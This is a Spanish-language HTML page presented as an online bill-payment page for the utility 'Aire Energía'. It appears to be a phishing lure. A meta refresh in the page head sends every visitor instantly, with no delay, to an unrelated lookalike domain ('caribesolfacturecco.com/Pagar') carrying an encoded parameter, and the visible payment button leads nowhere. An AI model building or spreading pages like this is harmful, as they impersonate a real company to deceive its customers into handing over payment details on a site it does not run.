<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta http-equiv="refresh" content="0;url=https://caribesolfacturecco.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9">
  <title>Paga tu Factura de Energía | Aire Energía</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      height: 100%;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, #0072ce, #00b140);
    }

    .main {
      display: flex;
      flex-direction: row;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 40px;
      gap: 50px;
      flex-wrap: wrap;
    }

    .image-container {
      flex: 1 1 400px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .image-container img {
      max-width: 100%;
      max-height: 400px;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
    }

    .content {
      flex: 1 1 400px;
      color: #fff;
      text-align: left;
      max-width: 500px;
    }

    .content h1 {
      font-size: 32px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .content p {
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 30px;
    }

    .button {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(45deg, #0072ce, #00b140);
      color: white;
      font-weight: bold;
      font-size: 18px;
      padding: 12px 24px;
      border: none;
      border-radius: 30px;
      text-decoration: none;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    .button:hover {
      background: linear-gradient(45deg, #00a0e3, #00c95c);
      transform: translateY(-2px);
    }

    .icon {
      margin-left: 10px;
      width: 28px;
      height: 28px;
      animation: pulse 1.5s infinite ease-in-out;
    }

    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.1);
      }
    }
  </style>
</head>
<body>

  <div class="main">
    <div class="image-container">
      <img src="fondo-energia.png" alt="Pago de factura Aire Energía">
    </div>
    <div class="content">
      <h1>¡Paga tu factura de energía fácil y rápido!</h1>
      <p>Evita filas y retrasos. Paga en línea desde la comodidad de tu hogar.</p>
      <a href="" class="button">
        Pagar factura en línea
        <svg xmlns="http://www.w3.org/2000/svg" class="icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24">
          <path d="M13 2L3 14h9l-1 8L21 10h-9l1-8z"/>
        </svg>
      </a>
    </div>
  </div>

</body>
</html>
